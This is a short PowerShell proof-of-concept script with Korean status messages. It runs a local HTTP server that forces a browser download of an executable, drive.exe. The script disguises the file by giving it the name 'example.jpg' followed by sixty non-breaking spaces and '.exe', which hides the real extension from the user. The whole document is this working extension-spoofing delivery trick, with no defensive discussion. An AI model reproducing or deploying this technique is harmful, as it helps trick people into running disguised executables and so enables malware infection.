$listener = New-Object System.Net.HttpListener
$listener.Prefixes.Add("http://localhost:3000/")
$listener.Start()

Write-Host "서버 시작... http://localhost:3000 에 접속하세요"
Write-Host "브라우저에서 접속하면 자동으로 다운로드됩니다"

$context = $listener.GetContext()
$request = $context.Request
$response = $context.Response

# Content-Disposition 헤더 설정
$nbsp = [char]0xA0
$filename = "example.jpg$($nbsp * 60).exe"
$response.AddHeader("Content-Disposition", "attachment; filename=""$filename""")
$response.ContentType = "application/octet-stream"

Write-Host "다운로드 요청 감지! 파일명: $filename"

# drive.exe 파일 전송
$filePath = "D:\sources\sve_poc\files\drive.exe"
if (Test-Path $filePath) {
    $file = [System.IO.File]::ReadAllBytes($filePath)
    $response.OutputStream.Write($file, 0, $file.Length)
    Write-Host "파일 전송 완료"
} else {
    Write-Host "오류: 파일을 찾을 수 없습니다: $filePath"
}

$response.OutputStream.Close()

Write-Host "다운로드 완료. 서버 종료."
$listener.Stop()
